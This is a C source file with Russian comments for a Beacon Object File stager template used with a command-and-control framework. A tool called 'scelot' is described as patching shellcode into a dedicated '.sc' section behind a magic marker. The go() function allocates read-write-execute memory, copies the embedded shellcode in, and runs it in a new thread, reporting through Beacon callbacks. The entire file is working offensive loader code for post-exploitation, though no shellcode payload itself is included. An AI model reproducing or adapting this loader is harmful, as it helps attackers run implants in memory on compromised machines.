// BOF-стейджер: патчится scelot'ом для встраивания шеллкода.
//
// Этот файл компилируется один раз при сборке проекта в COFF .o.
// scelot при флаге --bof находит секцию .sc, расширяет её и записывает
// сюда [magic 8 байт][длина 4 байта][шеллкод]. Никакого внешнего
// компилятора при использовании scelot не требуется.

#include "..\bof_api.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree (LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T,
                                                    LPTHREAD_START_ROUTINE, LPVOID,
                                                    DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

#pragma section(".sc", read, write)

// 16-байтовый placeholder. scelot расширяет секцию до:
//   [8 байт magic CECACECA01020304][4 байта длина LE][N байт шеллкода]
__declspec(allocate(".sc"))
static unsigned char sc_blob[16] = {
    0xCE, 0xCA, 0xCE, 0xCA, 0x01, 0x02, 0x03, 0x04,  // magic — ищется scelot'ом
    0x00, 0x00, 0x00, 0x00,                          // длина шеллкода (LE)
    0x00, 0x00, 0x00, 0x00,                          // первые байты шеллкода
};

void go(char* args, int alen) {
    (void)args; (void)alen;

    unsigned int len = *(unsigned int*)(sc_blob + 8);
    if (len == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[stager] template not patched\n");
        return;
    }

    void* mem = KERNEL32$VirtualAlloc(NULL, len, 0x3000 /* COMMIT|RESERVE */,
                                       0x40 /* RWX */);
    if (!mem) {
        BeaconPrintf(CALLBACK_ERROR, "[stager] VirtualAlloc failed\n");
        return;
    }

    unsigned char* src = sc_blob + 12;
    for (unsigned int i = 0; i < len; ++i)
        ((unsigned char*)mem)[i] = src[i];

    HANDLE th = KERNEL32$CreateThread(NULL, 0,
                                       (LPTHREAD_START_ROUTINE)mem,
                                       NULL, 0, NULL);
    if (!th) {
        KERNEL32$VirtualFree(mem, 0, 0x8000 /* RELEASE */);
        BeaconPrintf(CALLBACK_ERROR, "[stager] CreateThread failed\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[stager] %u bytes launched\n", len);
    KERNEL32$WaitForSingleObject(th, 0xFFFFFFFF);
    KERNEL32$CloseHandle(th);
}
